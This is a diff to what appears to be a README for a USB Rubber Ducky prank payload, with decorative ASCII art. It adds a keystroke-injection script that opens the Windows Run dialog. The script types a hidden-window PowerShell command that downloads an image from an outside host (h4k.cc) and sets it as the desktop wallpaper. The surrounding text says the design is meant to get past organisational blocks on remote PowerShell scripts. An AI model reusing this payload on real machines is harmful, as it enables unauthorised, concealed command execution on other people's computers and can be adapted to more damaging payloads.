@@ -62,6 +62,41 @@ powershell -w h -c "[Net.ServicePointManager]::SecurityProtocol='tls12';$a=$ENV:
 
 it drops to 258 characters.
 
+```
+WWWWWWWW                           WWWWWWWWIIIIIIIIIINNNNNNNN        NNNNNNNN      !!! 
+W::::::W                           W::::::WI::::::::IN:::::::N       N::::::N     !!:!!
+W::::::W                           W::::::WI::::::::IN::::::::N      N::::::N     !:::!
+W::::::W                           W::::::WII::::::IIN:::::::::N     N::::::N     !:::!
+ W:::::W           WWWWW           W:::::W   I::::I  N::::::::::N    N::::::N     !:::!
+  W:::::W         W:::::W         W:::::W    I::::I  N:::::::::::N   N::::::N     !:::!
+   W:::::W       W:::::::W       W:::::W     I::::I  N:::::::N::::N  N::::::N     !:::!
+    W:::::W     W:::::::::W     W:::::W      I::::I  N::::::N N::::N N::::::N     !:::!
+     W:::::W   W:::::W:::::W   W:::::W       I::::I  N::::::N  N::::N:::::::N     !:::!
+      W:::::W W:::::W W:::::W W:::::W        I::::I  N::::::N   N:::::::::::N     !:::!
+       W:::::W:::::W   W:::::W:::::W         I::::I  N::::::N    N::::::::::N     !!:!!
+        W:::::::::W     W:::::::::W          I::::I  N::::::N     N:::::::::N      !!! 
+         W:::::::W       W:::::::W         II::::::IIN::::::N      N::::::::N          
+          W:::::W         W:::::W          I::::::::IN::::::N       N:::::::N      !!! 
+           W:::W           W:::W           I::::::::IN::::::N        N::::::N     !!:!!
+            WWW             WWW            IIIIIIIIIINNNNNNNN         NNNNNNN      !!! 
+```
+
 ### Other Notes
 
-I am aware that I could make this a 2 stage payload or load the script externally, but as many organizations protect against remote PowerShell scripts and I want this to execute entirely within the Run dialog, I am currently looking for an alias which will ideally perform this in less than 20 characters.
+I am aware that I could make this a 2 stage payload or load the script externally, but as many organizations protect against remote PowerShell scripts and I want this to execute entirely within the Run dialog,
+
+```
+      _      _      _      USB       _      _      _
+   __(.)< __(.)> __(.)=   Rubber   >(.)__ <(.)__ =(.)__
+   \___)  \___)  \___)    Ducky!    (___/  (___/  (___/ 
+```
+
+This could very easily not be transformed into a [USB Rubber Ducky script](https://github.com/hak5darren/USB-Rubber-Ducky)
+
+```
+DELAY 3000
+GUI r
+DELAY 300
+STRING powershell -w h -c "[Net.ServicePointManager]::SecurityProtocol='tls12';$a=$ENV:TMP+'a.jpg';iwr -Uri h4k.cc/b.jpg -OutFile $($a);sp 'HKCU:Control Panel\Desktop' WallPaper $($a);1..60|%{RUNDLL32.EXE USER32.DLL,UpdatePerUserSystemParameters ,1 ,True;sleep 1}"
+ENTER 
+```
